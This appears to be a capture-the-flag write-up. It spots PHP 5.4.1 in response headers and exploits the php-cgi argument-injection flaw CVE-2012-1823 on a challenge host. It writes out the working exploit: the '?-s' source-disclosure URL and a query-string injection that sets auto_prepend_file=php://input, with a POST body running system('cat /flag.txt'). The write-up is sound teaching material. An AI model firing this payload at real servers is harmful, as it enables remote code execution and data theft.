## Solution
* Exploring the page, we find that it is static and there are no interesting functionalities
* Looking at the requests and responses on Burp Suite, we see that too much server information is revealed<br/>

```
HTTP/1.1 200 OK
Date: Sun, 02 Aug 2020 15:37:05 GMT
Server: Apache/2.4.25 (Unix)
X-Powered-By: PHP/5.4.1
Connection: close
Content-Type: text/html
Content-Length: 8117
```

* Looking up on CVE (Common Vulnerabilities and Exposures) for the given server versions, we find [CVE-2012-1823 ](https://nvd.nist.gov/vuln/detail/CVE-2012-1823), which is found in applications of certain PHP versions using `CGI script (aka php-cgi)`
* Proof of concept - [POC](https://qiita.com/okmt1230z/items/b341a741381d050ef86b)
* It is a cakewalk from here-on, just have to follow the above POC
* Visit [jh2i.com:50008/?-s](jh2i.com:50008/?-s) to get the source code
* Notice that the source code reveals the location of the flag - `/flag.txt`
* Make a `POST Request` to [jh2i.com:50008/?-d+allow_url_include%3DOn+-d+auto_prepend_file%3Dphp://input](jh2i.com:50008/?-d+allow_url_include%3DOn+-d+auto_prepend_file%3Dphp://input) with `<?php system('cat /flag.txt'); ?>` as `POST data` to obtain the flag<br/>

```
